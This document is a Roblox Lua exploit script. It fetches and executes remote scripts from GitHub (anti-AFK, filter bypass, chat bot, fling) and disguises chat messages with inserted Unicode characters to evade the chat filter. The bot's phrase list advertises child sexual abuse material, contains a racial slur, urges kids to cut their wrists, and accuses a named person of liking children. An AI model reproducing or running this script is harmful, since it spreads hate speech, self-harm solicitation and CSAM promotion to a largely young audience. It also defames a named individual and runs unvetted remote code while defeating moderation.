-- 1. Anti-AFK
local function runAFK()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))()
end

-- 2. Bypass & Configuration Logic
local function runBypass()
    local SpecialCharacter = utf8.char(0x060D)
    local function utf8_chars(str)
        local chars = {}
        for _, c in utf8.codes(str) do table.insert(chars, utf8.char(c)) end
        return chars
    end
    local function utf8_reverse(str)
        local chars = utf8_chars(str)
        local rev = {}
        for i = #chars, 1, -1 do table.insert(rev, chars[i]) end
        return table.concat(rev)
    end
    local function Convert(Text)
        local Reverse = utf8_reverse(Text)
        local New = {}
        for Word in Reverse:gmatch("%S+") do
            local Letters = utf8_chars(Word)
            local Fill = SpecialCharacter .. table.concat(Letters, SpecialCharacter)
            table.insert(New, Fill)
        end
        return table.concat(New, " ")
    end

    local Raw = {
        "Join for CP/pfYQ9rtdcy", "If you want to see a expose of Kiceba then join /pfYQ9rtdcy",
        "THIS GAME IS OWNED BY NIGGERS /pfYQ9rtdcy", "/pfYQ9rtdcy. Bots run by YBRATS",
        "JOIN 4 CP /pfYQ9rtdcy", "KIDS CUT WRISTS FOR US /pfYQ9rtdcy",
        "Draw blood for US /pfYQ9rtdcy", "I hope your hiatus was fun /pfYQ9rtdcy",
        "Baptize Me /pfYQ9rtdcy", "KICEBA LIKES CHILDREN /pfYQ9rtdcy",
        "JOIN UP /pfYQ9rtdcy", "JOIN PLS /pfYQ9rtdcy"
    }

    local Bypassed = {}
    for _, v in ipairs(Raw) do table.insert(Bypassed, Convert(v)) end

    -- Structure for the Bot.lua
    getgenv().BotConfig = { 
        DefaultPhrases = Bypassed,
        WaitTime = 10 -- Force a 10-second delay between messages
    }
    getgenv().Blacklist = { blacklistt = {{}} }
    
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pemenbkurtis-lang/roblox.mythuuuu/refs/heads/main/bypass.lua"))()
end

-- 3. Features
local function runFeatures()
    -- Load the Bot first
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pemenbkurtis-lang/roblox.mythuuuu/refs/heads/main/Bot.lua"))()
    
    -- WAIT 5 seconds before loading Fling to let the Bot settle
    task.wait(5)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pemenbkurtis-lang/roblox.mythuuuu/refs/heads/main/Fling.lua"))()
end

-- Execution Sequence
task.spawn(runBypass)
task.wait(2) -- Give the bypass extra time to hook
task.spawn(runAFK)
task.wait(1)
task.spawn(runFeatures)
